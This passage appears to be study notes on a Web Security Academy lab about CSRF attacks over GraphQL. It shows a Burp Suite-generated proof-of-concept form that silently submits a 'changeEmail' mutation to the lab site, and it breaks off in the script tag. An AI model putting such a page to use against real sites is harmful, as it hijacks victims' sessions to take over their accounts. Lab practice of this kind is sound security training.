...
- Performing **CSRF** exploits over GraphQL
  ...
  - Generate CSRF PoC  
     ...
     <html>
	  <!-- CSRF PoC - generated by Burp Suite Professional -->
	  <body>
	    <form action="https://0a1a000c0366f2eb81a5256400dd00dd.web-security-academy.net/graphql/v1" method="POST">
	      <input type="hidden" name="query" value="<HTML Encode>" />
	      <input type="hidden" name="operationName" value="changeEmail" />
	      <input type="hidden" name="variables" value="<HTML Encode>" />
	      <input type="submit" value="Submit request" />
	    </form>
	    <script>
	      history.pushState('', '', '/');
